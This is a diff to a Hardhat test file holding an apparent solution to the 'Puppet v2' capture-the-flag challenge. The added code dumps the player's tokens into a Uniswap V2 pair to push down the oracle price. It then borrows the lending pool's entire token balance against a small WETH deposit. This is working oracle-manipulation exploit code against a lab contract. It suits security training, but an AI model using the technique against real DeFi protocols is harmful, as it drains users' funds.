@@ -5,6 +5,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { BigNumber: BN } = ethers;
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, player;
@@ -103,9 +104,28 @@ describe('[Challenge] Puppet v2', function () {
             console.log('-----------------------------------------------');
         }
 
-        await getReport();
+        // await getReport();
 
-        
+        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;
+        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await uniswapRouter.connect(player).swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE, 
+            0, 
+            [
+                token.address,
+                weth.address
+            ], 
+            player.address, 
+            deadline
+        );
+
+        // await getReport();
+
+        const ethBalance = await lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await weth.connect(player).deposit({ value: ethBalance });
+        await weth.connect(player).approve(lendingPool.address, ethBalance);
+
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
@@ -114,7 +134,7 @@ describe('[Challenge] Puppet v2', function () {
         expect(
             await token.balanceOf(lendingPool.address)
         ).to.be.eq(0);
-
+    
         expect(
             await token.balanceOf(player.address)
         ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE);
